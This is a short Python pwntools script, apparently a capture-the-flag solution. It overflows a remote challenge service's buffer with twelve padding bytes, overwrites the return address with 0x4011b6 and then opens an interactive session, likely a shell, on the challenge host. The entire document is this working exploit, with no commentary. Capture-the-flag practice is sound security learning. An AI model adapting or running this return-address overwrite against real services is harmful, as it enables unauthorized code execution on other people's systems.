#!/usr/bin/env python

from pwn import *

offset = 12
pattern = "A" * offset
address = "\xb6\x11\x40\x00\x00\x00\x00\x00"

payload = pattern + address

host = "0.cloud.chals.io"
port = 10197

c = remote(host,port)

c.recvuntil(b"!!!")
c.sendline(bytes(payload,"latin-1"))
c.recv()
c.interactive()
